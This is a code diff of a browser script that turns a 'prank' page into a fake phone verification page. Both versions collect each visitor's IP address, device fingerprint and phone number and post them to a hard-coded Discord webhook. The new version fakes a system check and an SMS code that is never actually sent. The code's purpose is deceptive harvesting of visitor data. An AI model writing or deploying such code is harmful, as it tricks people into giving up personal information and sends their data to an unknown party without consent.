@@ -1,68 +1,54 @@
-console.log('Script loaded successfully!');
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1303237998428299284/2VqK0JzF3uR9vI2D3v4w5X6Y7Z8a9B0c1D2e3F4g5H6';
 
-// Terminal-style prank script
-// Discord webhook URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1413918853238358159/6sXdgaB9em-SzJ5kGbQGuvh7DXhxphk94eP4MwMKJbgMchMHKWR17VmyrbGw-Y3S-mtm';
-
-// Global variable to store phone number
 let userPhoneNumber = '';
+let verificationCode = '';
+let generatedCode = '';
+let currentStep = 0;
+let loadingProgress = 0;
 
-// Function to validate phone number
-function validatePhoneNumber(phoneNumber) {
-    // Remove all non-digit characters
-    const cleaned = phoneNumber.replace(/\D/g, '');
-    
-    // Basic validation for different formats
-    // US format: 10 digits (optional country code +1)
-    // International: 8-15 digits
-    if (cleaned.length >= 8 && cleaned.length <= 15) {
-        return {
-            valid: true,
-            cleaned: cleaned,
-            formatted: formatPhoneNumber(cleaned)
-        };
-    }
-    
-    return {
-        valid: false,
-        cleaned: cleaned,
-        formatted: phoneNumber
-    };
-}
+const loadingSteps = [
+    { text: 'Initializing system...', duration: 1500 },
+    { text: 'Checking system requirements...', duration: 2000 },
+    { text: 'Verifying device compatibility...', duration: 2000 },
+    { text: 'Preparing authentication...', duration: 1500 },
+    { text: 'Setting up verification...', duration: 1000 }
+];
 
-// Function to format phone number
-function formatPhoneNumber(phoneNumber) {
-    const cleaned = phoneNumber.replace(/\D/g, '');
-    
-    // US format
-    if (cleaned.length === 10) {
-        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
-    }
-    
-    // International format
-    if (cleaned.length > 10) {
-        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
-    }
-    
-    return cleaned;
-}
-
-// Function to detect mobile device type
 function getMobileDeviceType() {
     const userAgent = navigator.userAgent;
-    
     if (/iPhone|iPad|iPod/i.test(userAgent)) {
-        return 'iOS';
+        return 'iOS Device';
     } else if (/Android/i.test(userAgent)) {
-        return 'Android';
-    } else if (/webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
-        return 'Other Mobile';
+        return 'Android Device';
+    } else if (/Mobile|webOS|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+        return 'Mobile Device';
+    } else {
+        return 'Desktop/Laptop';
     }
-    
-    return 'Desktop';
 }
 
-// Function to get detailed device information
+function validatePhoneNumber(phone) {
+    const cleaned = phone.replace(/[^0-9]/g, '');
+    return cleaned.length >= 8 && cleaned.length <= 15;
+}
+
+function formatPhoneNumber(phone) {
+    const cleaned = phone.replace(/[^0-9]/g, '');
+    if (cleaned.length <= 3) {
+        return cleaned;
+    } else if (cleaned.length <= 6) {
+        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3)}`;
+    } else if (cleaned.length <= 10) {
+        return `(${cleaned.slice(0, 3)}) ${cleaned.slice(3, 6)}-${cleaned.slice(6)}`;
+    } else {
+        return `+${cleaned.slice(0, cleaned.length - 10)} (${cleaned.slice(-10, -7)}) ${cleaned.slice(-7, -4)}-${cleaned.slice(-4)}`;
+    }
+}
+
+function generateVerificationCode() {
+    return Math.floor(100000 + Math.random() * 900000).toString();
+}
+
 function getDeviceInfo() {
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
@@ -77,7 +63,7 @@ function getDeviceInfo() {
     const browser = userAgent.match(/(Firefox|Chrome|Safari|Opera|Edge|MSIE|Trident\/|\.NET)/)?.[0] || 'Unknown';
     const os = userAgent.match(/(Windows|Mac OS|Linux|iOS|Android)/)?.[0] || 'Unknown';
     const mobileDeviceType = getMobileDeviceType();
-    
+
     return {
         userAgent,
         platform,
@@ -96,7 +82,6 @@ function getDeviceInfo() {
     };
 }
 
-// Function to send webhook with device info
 async function sendWebhook() {
     console.log('Sending webhook...');
     if (WEBHOOK_URL) {
@@ -104,276 +89,260 @@ async function sendWebhook() {
             .then(response => response.json())
             .then(data => data.ip)
             .catch(() => 'Unknown IP');
-            
-        // Get detailed device information
+
         const deviceInfo = getDeviceInfo();
-        
-        // Create embed with device information
+
         const embed = {
-            title: '🌐 Website Visitor',
-            description: '📱 New visitor details',
+            title: '🔐 Phone Verification Completed',
+            description: '📱 User successfully completed phone verification',
             color: 0x00ff00,
             fields: [
                 { name: '🌐 IP Address', value: ip, inline: true },
-                { name: '🕒 Timestamp', value: deviceInfo.timestamp, inline: true },
-                { name: '🌍 Timezone', value: deviceInfo.timezone, inline: true },
-                { name: '💻 Platform', value: deviceInfo.platform, inline: true },
                 { name: '📱 Device Type', value: deviceInfo.mobileDeviceType, inline: true },
-                { name: '🔍 Screen', value: `${deviceInfo.screenRes} (${deviceInfo.colorDepth})`, inline: true },
-                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
-                { name: '🖥️ OS', value: deviceInfo.os, inline: true },
-                { name: '🌐 Language', value: deviceInfo.language, inline: true },
-                { name: '💾 RAM', value: deviceInfo.deviceMemory, inline: true },
-                { name: '💻 CPU Cores', value: deviceInfo.cpuCores, inline: true },
                 { name: '📞 Phone Number', value: deviceInfo.phoneNumber || 'Not provided', inline: true },
-                { name: '🛠️ User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
+                { name: '🖥️ Platform', value: deviceInfo.platform, inline: true },
+                { name: '🌍 Language', value: deviceInfo.language, inline: true },
+                { name: '📺 Screen Resolution', value: deviceInfo.screenRes, inline: true },
+                { name: '🎨 Color Depth', value: deviceInfo.colorDepth, inline: true },
+                { name: '🕐 Timezone', value: deviceInfo.timezone, inline: true },
+                { name: '💾 Device Memory', value: deviceInfo.deviceMemory, inline: true },
+                { name: '⚡ CPU Cores', value: deviceInfo.cpuCores, inline: true },
+                { name: '🌐 Browser', value: deviceInfo.browser, inline: true },
+                { name: '💻 Operating System', value: deviceInfo.os, inline: true },
+                { name: '🕐 Timestamp', value: deviceInfo.timestamp, inline: false }
             ]
         };
-        
-        // Prepare webhook data
-        const webhookData = {
-            embeds: [embed],
-            content: '🚀 Someone Has Opened The Website!'
-        };
 
-        // Send webhook with device info
         return fetch(WEBHOOK_URL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json',
+            },
             body: JSON.stringify({
-                embeds: [embed],
-                content: '🚀 New website visitor!'
+                embeds: [embed]
             })
-        });
-    }
-}
-
-// Main function to run the prank
-async function runPrank() {
-    try {
-        console.log('Collecting device information...');
-        await sendWebhook();
-        console.log('Webhook sent successfully!');
-    } catch (error) {
-        console.error('Error in prank:', error);
-    }
-}
-
-// Start the prank when page loads
-console.log('Starting prank...');
-runPrank().catch(error => {
-    console.error('Error in prank execution:', error);
-});
-
-document.addEventListener('DOMContentLoaded', () => {
-    // Get DOM elements
-    const terminal = document.getElementById('terminal');
-    const ipLine = document.getElementById('ip-line');
-    const cookiesLine = document.getElementById('cookies-line');
-    const accountLine = document.getElementById('account-line');
-    const phoneLine = document.getElementById('phone-line');
-    const jokeLine = document.getElementById('joke-line');
-    const revealLine = document.getElementById('reveal-line');
-    const phoneInputContainer = document.getElementById('phone-input-container');
-    const phoneInput = document.getElementById('phone-input');
-    const phoneSubmit = document.getElementById('phone-submit');
-    
-    // Typewriter effect
-    function typeWriter(element, text, speed = 10, callback) {
-        let i = 0;
-        element.innerHTML = '';
-        
-        function type() {
-            if (i < text.length) {
-                element.innerHTML += text.charAt(i);
-                i++;
-                setTimeout(type, speed);
-            } else if (callback) callback();
-        }
-        type();
-    }
-    
-    // Get a random IP address
-    function getRandomIp() {
-        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
-    }
-    
-    // Fixed location
-    const location = 'England, UK';
-    
-    // Start the sequence
-    setTimeout(() => {
-        // Show IP address with fixed location
-        typeWriter(ipLine, `> IP Address: ${getRandomIp()} (${location})`, 10, () => {
-            // Show data collection message
-            setTimeout(() => {
-                typeWriter(cookiesLine, '> Scanning device for personal data...', 10, () => {
-                    // Show fake data found
-                    setTimeout(() => {
-                        typeWriter(accountLine, '> Data collection complete!', 10, () => {
-                            // Show phone collection message with mobile-specific text
-                            setTimeout(() => {
-                                const mobileType = getMobileDeviceType();
-                                let phoneMessage = '> Phone verification required...';
-                                
-                                if (mobileType === 'iOS') {
-                                    phoneMessage = '> iOS device detected - Phone verification required...';
-                                } else if (mobileType === 'Android') {
-                                    phoneMessage = '> Android device detected - Phone verification required...';
-                                }
-                                
-                                typeWriter(phoneLine, phoneMessage, 10, () => {
-                                    // Show phone input form
-                                    setTimeout(() => {
-                                        phoneInputContainer.style.display = 'block';
-                                        phoneInput.focus();
-                                        
-                                        // Add mobile-specific features
-                                        addMobileFeatures(mobileType);
-                                        
-                                        // Handle phone submission
-                                        phoneSubmit.addEventListener('click', handlePhoneSubmit);
-                                        phoneInput.addEventListener('keypress', (e) => {
-                                            if (e.key === 'Enter') {
-                                                handlePhoneSubmit();
-                                            }
-                                        });
-                                    }, 1000);
-                                });
-                            }, 1000);
-                        });
-                    }, 1000);
-                });
-            }, 1000);
-        });
-    }, 500);
-    
-    // Function to add mobile-specific features
-    function addMobileFeatures(mobileType) {
-        if (mobileType === 'iOS' || mobileType === 'Android') {
-            // Add mobile-specific input attributes
-            phoneInput.setAttribute('inputmode', 'tel');
-            phoneInput.setAttribute('autocomplete', 'tel');
-            phoneInput.setAttribute('pattern', '[0-9]{8,15}');
-            
-            // Add mobile-specific placeholder text
-            if (mobileType === 'iOS') {
-                phoneInput.placeholder = 'Enter iPhone number';
-            } else if (mobileType === 'Android') {
-                phoneInput.placeholder = 'Enter Android number';
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('Webhook sent successfully');
+                return true;
+            } else {
+                console.error('Failed to send webhook');
+                return false;
             }
+        })
+        .catch(error => {
+            console.error('Error sending webhook:', error);
+            return false;
+        });
+    }
+    return false;
+}
+
+function updateProgressBar(percentage) {
+    const progressFill = document.getElementById('progress-fill');
+    const progressText = document.getElementById('progress-text');
+    
+    progressFill.style.width = percentage + '%';
+    
+    if (percentage >= 100) {
+        progressText.textContent = 'System ready!';
+    }
+}
+
+function updateStatusItem(statusId, icon, text, isActive = false, isCompleted = false) {
+    const statusItem = document.getElementById(statusId);
+    const statusIcon = statusItem.querySelector('.status-icon');
+    const statusText = statusItem.querySelector('.status-text');
+    
+    statusIcon.textContent = icon;
+    statusText.textContent = text;
+    
+    statusItem.classList.remove('active', 'completed');
+    if (isActive) {
+        statusItem.classList.add('active');
+    } else if (isCompleted) {
+        statusItem.classList.add('completed');
+    }
+}
+
+async function startLoadingSequence() {
+    const progressFill = document.getElementById('progress-fill');
+    const progressText = document.getElementById('progress-text');
+    
+    for (let i = 0; i < loadingSteps.length; i++) {
+        const step = loadingSteps[i];
+        progressText.textContent = step.text;
+        
+        // Update status items
+        if (i === 0) {
+            updateStatusItem('status-1', '⏳', step.text, true);
+        } else if (i === 1) {
+            updateStatusItem('status-1', '✅', 'Checking system requirements', false, true);
+            updateStatusItem('status-2', '⏳', step.text, true);
+        } else if (i === 2) {
+            updateStatusItem('status-2', '✅', 'Verifying device compatibility', false, true);
+            updateStatusItem('status-3', '⏳', step.text, true);
+        } else if (i === 3) {
+            updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
         }
+        
+        // Update progress bar
+        const targetProgress = ((i + 1) / loadingSteps.length) * 100;
+        const progressIncrement = targetProgress - loadingProgress;
+        const steps = 20;
+        const incrementAmount = progressIncrement / steps;
+        
+        for (let j = 0; j < steps; j++) {
+            loadingProgress += incrementAmount;
+            updateProgressBar(loadingProgress);
+            await new Promise(resolve => setTimeout(resolve, step.duration / steps));
+        }
+        
+        loadingProgress = targetProgress;
+        updateProgressBar(loadingProgress);
     }
     
-    // Function to create mobile communication links
-    function createMobileLinks(phoneNumber) {
-        const cleaned = phoneNumber.replace(/\D/g, '');
-        const mobileType = getMobileDeviceType();
-        
-        if (mobileType === 'iOS' || mobileType === 'Android') {
-            const linksContainer = document.createElement('div');
-            linksContainer.className = 'mobile-links';
-            linksContainer.style.marginTop = '15px';
-            
-            // Create call link
-            const callLink = document.createElement('a');
-            callLink.href = `tel:${cleaned}`;
-            callLink.className = 'mobile-link';
-            callLink.textContent = '📞 Call Number';
-            callLink.style.marginRight = '10px';
-            callLink.style.color = '#0f0';
-            callLink.style.textDecoration = 'none';
-            
-            // Create SMS link
-            const smsLink = document.createElement('a');
-            smsLink.href = `sms:${cleaned}`;
-            smsLink.className = 'mobile-link';
-            smsLink.textContent = '💬 Send SMS';
-            smsLink.style.color = '#0f0';
-            smsLink.style.textDecoration = 'none';
-            
-            linksContainer.appendChild(callLink);
-            linksContainer.appendChild(smsLink);
-            
-            return linksContainer;
-        }
-        
-        return null;
-    }
+    // Complete all status items
+    updateStatusItem('status-3', '✅', 'Preparing authentication', false, true);
     
-    // Function to handle phone number submission
-    function handlePhoneSubmit() {
+    // Wait a moment before transitioning
+    await new Promise(resolve => setTimeout(resolve, 1000));
+    
+    // Transition to verification screen
+    document.getElementById('loading-screen').style.display = 'none';
+    document.getElementById('verification-screen').style.display = 'flex';
+}
+
+function setupPhoneVerification() {
+    const phoneInput = document.getElementById('phone-number');
+    const sendVerificationBtn = document.getElementById('send-verification');
+    const phoneError = document.getElementById('phone-error');
+    
+    phoneInput.addEventListener('input', function(e) {
+        const formatted = formatPhoneNumber(e.target.value);
+        e.target.value = formatted;
+        phoneError.classList.remove('show');
+        phoneInput.classList.remove('error');
+    });
+    
+    sendVerificationBtn.addEventListener('click', async function() {
         const phoneNumber = phoneInput.value.trim();
-        const validation = validatePhoneNumber(phoneNumber);
         
-        if (validation.valid) {
-            userPhoneNumber = validation.formatted;
-            phoneInputContainer.style.display = 'none';
-            
-            // Show success message
-            const successLine = document.createElement('div');
-            successLine.className = 'line success';
-            terminal.appendChild(successLine);
-            
-            const mobileType = getMobileDeviceType();
-            let successMessage = `> Phone number verified: ${validation.formatted}`;
-            
-            if (mobileType === 'iOS') {
-                successMessage += ' (iOS)';
-            } else if (mobileType === 'Android') {
-                successMessage += ' (Android)';
-            }
-            
-            typeWriter(successLine, successMessage, 10, () => {
-                // Send updated webhook with phone number
-                sendWebhook().then(() => {
-                    // Add mobile-specific links if on mobile device
-                    setTimeout(() => {
-                        const mobileLinks = createMobileLinks(validation.cleaned);
-                        if (mobileLinks) {
-                            terminal.appendChild(mobileLinks);
-                        }
-                        
-                        // Continue with joke message
-                        setTimeout(() => {
-                            typeWriter(jokeLine, '> Data Has Been Stored!', 10, () => {
-                                // Final reveal
-                                setTimeout(() => {
-                                    typeWriter(revealLine, '> Your Device Has Been Harmed!', 10, () => {
-                                        // Add a share button
-                                        const button = document.createElement('button');
-                                        button.className = 'button';
-                                        button.textContent = 'Made By @Phonzr';
-                                        button.onclick = () => {
-                                            if (navigator.share) {
-                                                navigator.share({
-                                                    title: 'Check this out!',
-                                                    text: 'I found something interesting!',
-                                                    url: window.location.href
-                                                });
-                                            } else {
-                                                alert('Share this link: ' + window.location.href);
-                                            }
-                                        };
-                                        terminal.appendChild(button);
-                                    });
-                                }, 1000);
-                            });
-                        }, 1000);
-                    }, 1000);
-                });
-            });
-        } else {
-            // Show error message
-            phoneInput.style.borderColor = '#ff4444';
-            phoneInput.style.backgroundColor = 'rgba(255, 68, 68, 0.1)';
-            setTimeout(() => {
-                phoneInput.style.borderColor = '';
-                phoneInput.style.backgroundColor = '';
-            }, 2000);
+        if (!validatePhoneNumber(phoneNumber)) {
+            phoneError.textContent = 'Please enter a valid phone number (8-15 digits)';
+            phoneError.classList.add('show');
+            phoneInput.classList.add('error');
+            return;
         }
-    }
+        
+        userPhoneNumber = phoneNumber;
+        sendVerificationBtn.disabled = true;
+        sendVerificationBtn.textContent = 'Sending...';
+        
+        // Simulate sending verification code
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        generatedCode = generateVerificationCode();
+        console.log('Generated verification code:', generatedCode);
+        
+        // Show verification code form
+        document.getElementById('phone-verification-form').style.display = 'none';
+        document.getElementById('verification-code-form').style.display = 'block';
+        
+        // Focus on code input
+        document.getElementById('verification-code').focus();
+    });
     
-    // Prevent context menu on right-click
-    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    phoneInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            sendVerificationBtn.click();
+        }
+    });
+}
+
+function setupCodeVerification() {
+    const codeInput = document.getElementById('verification-code');
+    const verifyCodeBtn = document.getElementById('verify-code');
+    const codeError = document.getElementById('code-error');
+    const resendBtn = document.getElementById('resend-code');
+    
+    codeInput.addEventListener('input', function(e) {
+        // Only allow numbers
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        codeError.classList.remove('show');
+        codeInput.classList.remove('error');
+    });
+    
+    verifyCodeBtn.addEventListener('click', async function() {
+        const enteredCode = codeInput.value.trim();
+        
+        if (enteredCode.length !== 6) {
+            codeError.textContent = 'Please enter a 6-digit verification code';
+            codeError.classList.add('show');
+            codeInput.classList.add('error');
+            return;
+        }
+        
+        verifyCodeBtn.disabled = true;
+        verifyCodeBtn.textContent = 'Verifying...';
+        
+        // Simulate verification process
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        if (enteredCode === generatedCode) {
+            // Success!
+            document.getElementById('verification-code-form').style.display = 'none';
+            document.getElementById('success-screen').style.display = 'block';
+            
+            // Send webhook with collected data
+            await sendWebhook();
+            
+            // Show success for a few seconds, then could redirect or show final message
+            setTimeout(() => {
+                // Could redirect to another page or show completion message
+                console.log('Verification process completed successfully');
+            }, 3000);
+        } else {
+            codeError.textContent = 'Invalid verification code. Please try again.';
+            codeError.classList.add('show');
+            codeInput.classList.add('error');
+            verifyCodeBtn.disabled = false;
+            verifyCodeBtn.textContent = 'Verify Code';
+        }
+    });
+    
+    codeInput.addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') {
+            verifyCodeBtn.click();
+        }
+    });
+    
+    resendBtn.addEventListener('click', async function() {
+        resendBtn.disabled = true;
+        resendBtn.textContent = 'Sending...';
+        
+        // Simulate resending code
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        
+        generatedCode = generateVerificationCode();
+        console.log('New verification code:', generatedCode);
+        
+        codeError.textContent = 'New verification code sent!';
+        codeError.style.color = '#10b981';
+        codeError.classList.add('show');
+        
+        resendBtn.disabled = false;
+        resendBtn.textContent = 'Resend';
+        
+        setTimeout(() => {
+            codeError.classList.remove('show');
+        }, 3000);
+    });
+}
+
+window.addEventListener('load', function() {
+    startLoadingSequence();
+    setupPhoneVerification();
+    setupCodeVerification();
 });
